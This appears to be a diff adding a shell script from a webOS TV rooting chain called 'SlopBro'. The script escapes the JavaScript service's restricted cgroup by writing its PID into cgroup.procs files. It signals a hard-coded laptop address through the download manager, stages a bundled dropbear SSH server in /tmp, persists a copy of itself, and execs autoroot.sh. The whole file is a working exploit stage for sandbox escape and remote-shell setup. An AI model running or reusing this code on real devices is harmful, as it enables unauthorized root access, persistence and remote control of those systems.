@@ -1,0 +1,41 @@
+#!/bin/sh
+# SlopBro cgroup-escape wrapper (shell script)
+# Invoked by main.js as: /bin/sh <this-file> ^_~ downloadDir shellScriptPath
+# $1=^_~  $2=downloadDir  $3=shellScriptPath
+
+DOWNLOAD_DIR="${2:-/media/internal/downloads}"
+SHELL_SCRIPT="${3:-${DOWNLOAD_DIR}/autoroot.sh}"
+LOG=/tmp/slopbro.log
+
+echo "$(date) rjsnc pid=$$ downloadDir=${DOWNLOAD_DIR} script=${SHELL_SCRIPT}" >> "${LOG}" 2>/dev/null
+
+# Ping laptop via download manager (works across network namespaces via Luna bus)
+luna-send -w 4000 -n 1 \
+  'luna://com.webos.service.downloadmanager/download' \
+  "{\"target\":\"http://192.168.1.35:9999/shell_rjsnc_started\",\"targetDir\":\"/media/internal/downloads\",\"targetFilename\":\"ping_shell\",\"subscribe\":false}" \
+  >/dev/null 2>/dev/null &
+
+# Escape jsserver's restricted cgroup so children survive after Node exits
+PID=$$
+for cgfile in \
+  /sys/fs/cgroup/cgroup.procs \
+  /sys/fs/cgroup/memory/cgroup.procs \
+  /sys/fs/cgroup/cpu,cpuacct/cgroup.procs \
+  /sys/fs/cgroup/freezer/cgroup.procs \
+  /sys/fs/cgroup/pids/cgroup.procs; do
+  echo "${PID}" > "${cgfile}" 2>/dev/null \
+    && echo "escaped ${cgfile}" >> "${LOG}" 2>/dev/null \
+    || echo "skip ${cgfile}" >> "${LOG}" 2>/dev/null
+done
+
+# Deploy bundled dropbear to /tmp so autoroot.sh can find it
+if [ -f "${DOWNLOAD_DIR}/dropbear" ] && [ ! -x /tmp/dropbear ]; then
+  cp -f "${DOWNLOAD_DIR}/dropbear" /tmp/dropbear && chmod 755 /tmp/dropbear
+  echo "dropbear -> /tmp/dropbear" >> "${LOG}" 2>/dev/null
+fi
+
+# Persist self to /tmp so future runs find the no-cgroup marker
+cp -f "$0" /tmp/run-js-service-no-cgroup 2>/dev/null && chmod 755 /tmp/run-js-service-no-cgroup
+
+# Hand off — exec autoroot.sh WITHOUT the ^_~ separator (it has set -e and no option for it)
+exec /bin/sh "${SHELL_SCRIPT}"
